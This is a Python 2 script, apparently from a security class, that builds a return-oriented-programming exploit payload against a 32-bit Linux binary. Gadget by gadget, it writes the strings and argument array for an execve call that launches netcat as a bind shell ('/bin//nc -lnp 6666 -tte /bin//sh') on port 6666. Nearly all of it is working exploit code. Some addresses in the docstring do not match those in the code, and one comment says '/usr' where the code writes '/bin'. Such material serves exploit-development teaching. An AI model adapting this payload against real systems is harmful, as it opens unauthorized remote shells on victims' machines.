"""
This is a demo python script that creates a ROP chain to launch nc as:
> /bin//nc -lnp 6666 -tte /bin//sh
The gadgets in the following code are based on my machine & binary and as a result you will have to adjust the gadget based on your environment.
With the latest ROPGadget tool that we used in the class, we get the following ropchain:
- Step 1 -- Write-what-where gadgets

	[+] Gadget found: 0x8056d05 mov dword ptr [edx], eax ; ret -> MOVISTACK
	[+] Gadget found: 0x806ee8b pop edx ; ret -> POPEDX
	[+] Gadget found: 0x80a8bf6 pop eax ; ret -> POPEAX
	[+] Gadget found: 0x80562c0 xor eax, eax ; ret -> XOREAX

- Step 2 -- Init syscall number gadgets

	[+] Gadget found: 0x80562c0 xor eax, eax ; ret
	[+] Gadget found: 0x807c32a inc eax ; ret -> INCEAX

- Step 3 -- Init syscall arguments gadgets

	[+] Gadget found: 0x80481c9 pop ebx ; ret -> POPEBX
	[+] Gadget found: 0x806eeb2 pop ecx ; pop ebx ; ret -> POPECX remember there is an extra POP, so you need to provide something meaningful for ebx too!
	[+] Gadget found: 0x806ee8b pop edx ; ret

- Step 4 -- Syscall gadget

	[+] Gadget found: 0x8049603 int 0x80

- Step 5 -- Build the ROP chain
 



"""





#!/usr/bin/env python
from struct import pack
import os
######################################
fileName=raw_input("Enter the file name")
outfile=open(fileName, "wb")
# this is just to create variables of the gadgets that we will be using
EDAX0      = pack("<I", 0x08050a88)
STACK      = pack("<I", 0x080ef240) # @ .data 
INT80      = pack("<I", 0x08049469) # int $0x80
MOVISTACK  = pack("<I", 0x0804eefa) # mov %eax,(%ecx) | ret
INCEAX     = pack("<I", 0x0807c56f) # inc %eax | ret 
POPALL     = pack("<I", 0x0805fd50) # pop %edx | pop %ecx | pop %ebx | ret;
									# we are mainly interested in pop %ecx, thus there will be pre and post dummy data for %edx and %ebx 
POPEAX     = pack("<I", 0x080c2386) # pop %eax | ret
XOREAX     = pack("<I", 0x0804e750) # xor %eax,%eax | ret
DUMMY      = pack("<I", 0x42424242) # padding

buff  = "\x42" * 32
buff += "BBBB"*3

buff += POPALL 				# it's via %ecx we will build our stack.
buff += DUMMY				# padding 
buff += STACK				# %ecx contain the stack address.
buff += DUMMY				# padding 
buff += POPEAX				# Lets put content in an address
buff += "/bin"				# put "/usr" in %eax
buff += MOVISTACK			# put "/bin" in stack address

buff += POPALL
buff += DUMMY				# padding 
buff += pack("<I", 0x080ef240 + 4)	# we change our stack for to point after "/bin"
buff += DUMMY				# padding 

buff += POPEAX				# Applying the same for "/nc"
buff += "//nc"
buff += MOVISTACK			# we place "//nc" after "/bin"

buff += POPALL
buff += DUMMY				# padding 
buff += pack("<I", 0x080ef240 + 9)	# we change our stack for to point after "bin//nc"+1
buff += DUMMY				# padding 

# we repeated operation for each argument
buff += POPEAX
buff += "-lnp"
buff += MOVISTACK

buff += POPALL
buff += DUMMY
buff += pack("<I", 0x080ef240 + 14)
buff += DUMMY

buff += POPEAX
buff += "6666"
buff += MOVISTACK

buff += POPALL
buff += DUMMY
buff += pack("<I", 0x080ef240 + 19)
buff += DUMMY

buff += POPEAX
buff += "-tte"
buff += MOVISTACK

buff += POPALL
buff += DUMMY
buff += pack("<I", 0x080ef240 + 24)
buff += DUMMY

buff += POPEAX
buff += "/bin"
buff += MOVISTACK

buff += POPALL
buff += DUMMY
buff += pack("<I", 0x080ef240 + 28)
buff += DUMMY

buff += POPEAX
buff += "//sh"
buff += MOVISTACK
#buff += DUMMY

#
# We currently have our list of elements separated by \0
# Now we must construct our char ** i.e. array 'argguments' of strings
# arguments=[ @"/bin//nc", @"-lnp", @"6666", @"-tte", @"/bin//sh"]
# 

buff += POPALL				
buff += DUMMY				# padding 
buff += pack("<I", 0x080ef240 + 60)	# shadow stack address (@ of arguments)
buff += DUMMY				# padding 

buff += POPEAX
buff += pack("<I", 0x080ef240) 		# @ of "/bin//nc" 0th item of arguments[]
buff += MOVISTACK			# we place address of "/bin//nc" in our STACK

buff += POPALL
buff += DUMMY				# padding 
buff += pack("<I", 0x080ef240 + 64)	# we shift our Stack Pointer + 4 for the second argument
buff += DUMMY				# padding 

buff += POPEAX
buff += pack("<I", 0x080ef249) 		# @ of "-lnp"
buff += MOVISTACK			# we place address of "-lnp" in our STACK

buff += POPALL
buff += DUMMY				# padding 
buff += pack("<I", 0x080ef240 + 68)	# we shift our Stack Pointer + 4 for the 3rd argument
buff += DUMMY				# padding 

buff += POPEAX
buff += pack("<I", 0x080ef24e) 		# @ of "6666"
buff += MOVISTACK			# we palce address of "6666" in our STACK

buff += POPALL
buff += DUMMY				# padding 
buff += pack("<I", 0x080ef240 + 72)	# we shift our Stack Pointer + 4 for the 4th argument
buff += DUMMY				# padding 

buff += POPEAX
buff += pack("<I", 0x080ef253) 		# @ of "-tte"
buff += MOVISTACK			# we place address of "-tte" in our STACK

buff += POPALL
buff += DUMMY				# padding 
buff += pack("<I", 0x080ef240 + 76)	# we shift our Stack Pointer + 4 for the 5th argument
buff += DUMMY				# padding 

buff += POPEAX
buff += pack("<I", 0x080ef258) 		# @ of "/bin//sh"
buff += MOVISTACK			# we place address of "/bin//sh" in our STACK

    #
    # Now we must implement eax to contain the address of 
    # the execve syscall.
    # execve = 0xb
    #

buff += XOREAX				# %eax is put to zero.
buff += INCEAX * 11			# %eax is now 0xb
buff += POPALL				# last pop 
buff += pack("<I", 0x080ef240 + 48) 	# edx char *env
buff += pack("<I", 0x080ef240 + 60) 	# ecx char **arguments
buff += pack("<I", 0x080ef240)      	# ebx "/usr/bin//nc"
buff += INT80				# we execute
outfile.write(buff)
outfile.close()

#print buff
